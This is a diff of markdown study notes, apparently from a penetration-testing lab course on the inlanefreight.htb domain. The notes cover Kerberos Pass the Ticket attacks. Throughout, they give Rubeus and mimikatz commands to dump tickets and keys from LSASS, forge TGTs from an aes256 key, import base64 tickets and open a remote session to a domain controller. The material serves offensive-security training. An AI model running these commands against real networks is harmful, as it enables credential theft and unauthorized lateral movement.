@@ -15,6 +15,7 @@ In this attack, we use a stolen Kerberos ticket to move laterally. It can be:
 - Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.
 - Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.
 
+
 ## Harvesting Kerberos Tickets from Windows
 
 On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it.
@@ -39,10 +40,16 @@ If running as Local admin it will dump all the tickets. `Rubeus dump`, instead o
 Rubeus.exe dump /nowrap
 ```
 
+Another interesting command:
+
+```powershell
+Rubeus.exe dump /extractkeys /nowrap
+```
+
 
 ## Forge your own tickets with Pass the Key or OverPass the Hash
 
-The `Pass the Key` or `OverPass the Hash` approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full `Ticket-Granting-Ticket (TGT)`.
+The traditional pass-the-hash technique involves reusing a hash through the NTLMv1/NTLMv2 protocol, which doesn't touch Kerberos at all. The `Pass the Key` or `OverPass the Hash` approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full `Ticket-Granting-Ticket (TGT)`.
 
 **Note:** Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.
 
@@ -111,14 +118,15 @@ Convert .kirbi to Base64 Format:
 
 Using Rubeus, we can perform a Pass the Ticket providing the base64 string instead of the file name.
 
-```cmd-session
+```powershell
 Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
 ```
 
 
 ## Pass the Ticket (PtT) with mimikatz
 
-```cmd-session
+```powershell
+#  we can use Mimikatz to import our ticket
 .\mimikatz.exe 
 privilege::debug
 kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
@@ -162,7 +170,7 @@ Rubeus has the option createnetonly, which creates a sacrificial process/logon s
 ```cmd-session
 Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
 
-# The command above will open a new cmd window.
+# The command above will open a new cmd window. The below commands will run on this new terminal window
 ```
 
 **2.** Rubeus - Pass the Ticket for Lateral Movement
@@ -170,12 +178,28 @@ Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
 Execute Rubeus to request a new TGT with the option /ptt to import the ticket into our current session:
 
 ```cmd-session
+# Extract keys. We did this in the Harvesting section
+Rubeus.exe dump /nowrap
+
+# Then pass the ticket
 Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
 ```
 
-**3.** Connect to the DC using PowerShell Remoting.
+Another way to import the ticket:
+
+```powershell
+# Extract keys. We did this in the Harvesting section
+Rubeus.exe dump /nowrap
+
+# Then pass the ticket:
+Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
+```
+
+
+**3.** Either with mimikatz or Rubeus, once we import the ticket we can connect to the DC using PowerShell Remoting.
 
 ```cmd-session
 powershell
 Enter-PSSession -ComputerName DC01
 ```
+
